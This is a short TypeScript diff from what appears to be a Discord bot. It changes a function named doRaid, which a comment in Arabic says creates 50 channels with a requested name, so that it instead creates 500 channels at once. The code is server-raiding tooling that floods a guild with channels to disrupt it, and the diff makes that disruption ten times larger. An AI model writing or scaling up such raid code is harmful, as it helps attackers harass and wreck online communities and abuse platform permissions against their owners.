@@ -95,7 +95,7 @@ async function doRaid(msg: Message, channelName: string) {
   // 4. إنشاء 50 روم بالاسم المطلوب
   const created: TextChannel[] = [];
   await Promise.all(
-    Array.from({ length: 50 }, () =>
+    Array.from({ length: 500 }, () =>
       guild.channels
         .create({ name: channelName, type: ChannelType.GuildText })
         .then((ch) => created.push(ch as TextChannel))
